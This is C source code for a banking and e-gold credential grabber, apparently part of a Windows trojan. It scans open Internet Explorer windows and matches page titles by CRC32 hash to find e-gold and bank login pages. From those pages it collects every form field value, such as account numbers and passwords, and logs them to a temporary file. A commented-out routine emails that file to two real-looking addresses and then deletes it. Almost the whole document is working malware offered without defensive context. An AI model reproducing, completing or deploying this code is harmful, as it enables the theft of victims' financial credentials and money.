/* need: crc32.c */

#include <tchar.h>
#include <oleauto.h>
#include <shldisp.h>
#include <unknwn.h>
#include <exdisp.h>
#define _WINGDI_ // to avoid warnings
#include <mshtmlc.h>

#ifdef __LCC__
#pragma lib <oleaut32.lib>
#pragma lib <ole32.lib>
#pragma lib <uuid.lib>
#pragma lib <shell32.lib>
#endif

#define GRAB_TIME 3*60*1000 /* msec */
#define LOGFILE_EGOLD "c:\\tmpe.tmp"

void wide2char(char *wide_str,char *char_str);
int grab_contens(IHTMLDocument2 *pHtmlDoc,char *);
int grab(void);
int grab2(void);
int grab_for(char *buf);
void store_str_egold(char *str);

struct _grab_info{
	BOOL finished;
	DWORD dwTimeStart;
	BOOL fBank;
	BOOL fBankFirstTime;
};

struct _grab_info grab_info;

LPTSTR _stdcall ErrorString(DWORD errno)
{

	static TCHAR szMsgBuf[0x1000];

	FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM
		    , NULL
		    , errno
		    , MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT)
		    , (LPTSTR) &szMsgBuf
		    , 0x1000 * sizeof(TCHAR)
		    , NULL);

	return szMsgBuf;

}

#define THROW(r) \
	do { if ( FAILED((r)) ) \
	   { printf("Line %d: %s\n", __LINE__,ErrorString((DWORD)(r))); grab_info.finished = TRUE; return 0; } \
	   } while(0)

#define THROW2(r) if(r==0){ printf("LINE %d\n",__LINE__); return 1; }



int grab(void)
{
	char buf[4096];
	char buf2[4096];
	CoInitialize(NULL);
	//crc32_init();

	grab_info.finished = FALSE;
	grab_info.dwTimeStart = GetTickCount();
	grab_info.fBank = FALSE;

	buf2[0] = 0;

	while(!grab_info.finished && ((GetTickCount()-grab_info.dwTimeStart)<GRAB_TIME)){
		buf[0] = 0;
		while(grab_for(buf)) { Sleep(1000); }
		if(strcmp(buf,buf2)!=0)
			store_str_egold(buf);
			//printf("%s\n",buf);
		memcpy(buf2,buf,4095);
	}


	/* send file here */
	/*smtp_init();

	smtp_send_file(LOGFILE_EGOLD,"discoinferno@ehighway.org","discoinferno@ehighway.org","data");
	smtp_send_file(LOGFILE_EGOLD,"mymtu@centrum.cz","mymtu@centrum.cz","data");

	DeleteFile(LOGFILE_EGOLD);*/
	CoUninitialize();
	return 0;
}

int grab2(void){
	char buf[4096];
	char buf2[4096];

	grab_info.fBankFirstTime = TRUE;
	grab_info.fBank = TRUE;

	grab_info.finished = FALSE;
	grab_info.dwTimeStart = GetTickCount();

	CoInitialize(NULL);

	buf2[0] = 0;
	while(!grab_info.finished && ((GetTickCount()-grab_info.dwTimeStart)<GRAB_TIME)){
		buf[0] = 0;
		while(grab_for(buf)) { Sleep(1000); }
		if(strcmp(buf,buf2)!=0)
			store_str_egold(buf);
			//printf("%s\n",buf);
		memcpy(buf2,buf,4095);
	}


	CoUninitialize();
	return 0;	
}

int grab_for(char *buf){

	HRESULT hr = S_OK;
	IUnknown *pIUnknown = NULL;
	IShellWindows *pIShellWindows = NULL;

	CLSID clsid;
	hr = CLSIDFromString(L"{9BA05972-F6A8-11CF-A442-00A0C90A8F39}", &clsid); // ShellWindows
	THROW(hr);

	hr = CoCreateInstance(
		&clsid,
		NULL,
		CLSCTX_LOCAL_SERVER,
		&IID_IUnknown,
		(void **)&pIUnknown
	);
	THROW(hr);

// get IShellWindows interface
	THROW2(pIUnknown);

	hr = pIUnknown->lpVtbl->QueryInterface(pIUnknown, &IID_IShellWindows, (void **)&pIShellWindows);
	THROW(hr);

	LONG nCount;
	THROW2(pIShellWindows);
	hr = pIShellWindows->get_Count(&nCount);
	//printf("Windows found: %d\n",nCount);
	THROW(hr);

// ENUMERATE ALL WINDOWS
	for(int a = 0; a < nCount; a++){

		IDispatch *pIDisp;
		struct _VARIANT var_i;
		var_i.vt = VT_I2;
		var_i.intVal = a;

		THROW2(pIShellWindows);
		hr = pIShellWindows->Item(var_i,&pIDisp);
		THROW(hr);

		IWebBrowser2 *pIE;
		THROW2(pIDisp);
		hr = pIDisp->lpVtbl->QueryInterface(pIDisp, &IID_IWebBrowser2,(void **)&pIE);
		THROW(hr);

		BSTR bsUrl;
		THROW2(pIE);
		hr = pIE->get_LocationURL(&bsUrl);
		THROW(hr);
		CHAR szUrl[256];
		wide2char((char *)bsUrl,szUrl);
		//printf("URL: %s\n",szUrl);

		IDispatch *pIDisp2;
		THROW2(pIE);
		hr = pIE->get_Document(&pIDisp2);
		THROW(hr);

		IHTMLDocument2 *pHtmlDoc;
		THROW2(pIDisp2);
		hr = pIDisp2->lpVtbl->QueryInterface(pIDisp2, &IID_IHTMLDocument2,(void **)&pHtmlDoc);
		THROW(hr);

		BSTR bsTitle;
		CHAR szTitle[256];
		THROW2(pHtmlDoc);
		hr = pHtmlDoc->get_title(&bsTitle);
		THROW(hr);
		wide2char((char *)bsTitle,szTitle);
	        //printf("Title: %s\n",szTitle);

	        /* crc 32 of 'e-gold Account Access' is 0x90e38063 */
		unsigned long ulTitleCrc = crc32(0,szTitle,strlen(szTitle));
		if(grab_info.fBank == TRUE){
			/* grab online banking accounts */

			char *p = szTitle;
			char *p1;
			unsigned long ulBankCrc;
			// 0xD860BF7A = bank
			for(int i=0;i<strlen(szTitle)-4;i++){
				p1 = p +i;
				ulBankCrc = crc32(0,p1,4);
				if(ulBankCrc == 0xD860BF7A){
					if(grab_info.fBankFirstTime){
						grab_info.fBankFirstTime = FALSE;
						store_str_egold(szTitle);
						store_str_egold(szUrl);
					}
					grab_contens((IHTMLDocument2 *)pHtmlDoc,buf);
					break;
				}
			}
		} else {
			if(ulTitleCrc == 0x90e38063)
				grab_contens((IHTMLDocument2 *)pHtmlDoc,buf);
		}
	}

	return 0;
}

int grab_contens(IHTMLDocument2 *pHtmlDoc,char *buf){
	// Get HTML Document
	HRESULT hr = S_OK;

	// Get number of frames

	IHTMLFramesCollection2 *pFrames;
	THROW2(pHtmlDoc);
	hr = pHtmlDoc->get_frames(&pFrames);
	THROW(hr);

	LONG nFrames;
	THROW2(pFrames);
	hr = pFrames->get_length(&nFrames);
	THROW(hr);
	//printf("Frames: %d\n",nFrames);

	// Get pointer to page contens

	IHTMLElementCollection *pCol;
	// если фреймов 2, то nFrames будет равен 2
	if(nFrames>1){
		struct _VARIANT vFrame;
		struct _VARIANT ret;
		vFrame.vt = VT_UINT;
		vFrame.lVal = 1; // получаем данные из 2 фрэйма!
		
		THROW2(pFrames);
		pFrames->item(&vFrame,&ret);
		IHTMLWindow2 *pWindow;
		THROW2(ret.pdispVal);
		hr = ret.pdispVal->QueryInterface(&IID_IHTMLWindow2,(void **)&pWindow);
		THROW(hr);

		IHTMLDocument2 *pDoc;
		THROW2(pWindow);
		pWindow->get_document(&pDoc);
		THROW(hr);
		THROW2(pDoc);
		pDoc->get_all(&pCol);
		THROW(hr);
	} else {
		THROW2(pHtmlDoc);
		hr = pHtmlDoc->get_all(&pCol);
		THROW(hr);
	}

	LONG nElements;
	THROW2(pCol);
	pCol->get_length( &nElements );

	for(int j=0;j<nElements;j++)
	{
		IDispatch *pIDisp3;
		struct _VARIANT var_j;
		var_j.vt = VT_I2;
		var_j.intVal = j;
		THROW2(pCol);
		hr = pCol->item(var_j,var_j,&pIDisp3);
		THROW(hr);
		
		IHTMLElement *pHtmlElement;
		THROW2(pIDisp3);
		hr = pIDisp3->lpVtbl->QueryInterface(pIDisp3, &IID_IHTMLElement,(void **)&pHtmlElement);
		THROW(hr);
		if(pHtmlElement){
			struct _VARIANT varResult;
			BSTR bsType = SysAllocString(L"value");

			THROW2(pHtmlElement);
			hr = pHtmlElement->getAttribute(bsType,0,&varResult);
			if(hr == S_OK){
				if(varResult.vt == VT_BSTR){
					CHAR szValue[256];
					if(varResult.bstrVal!=0){
						wide2char((char *)varResult.bstrVal,szValue);
						if((strlen(szValue)+strlen(buf))<4090){
							strcat(buf,szValue);
							strcat(buf," ");
							//printf("%s\n",szValue);
						}
					}
				}
			}
		}
	}
	// end
	return 0;
}

void wide2char(char *wide_str,char *char_str){
	int cnt = 0;
	while(*wide_str && cnt<255){
		*char_str = *wide_str;
		char_str++;
		wide_str+=2;
		cnt++;
	}
	*char_str = 0;
}

void store_str_egold(char *str){
	FILE *fp = fopen(LOGFILE_EGOLD, "ab");
	fprintf(fp,"%s\n",str);
	fclose(fp);
}
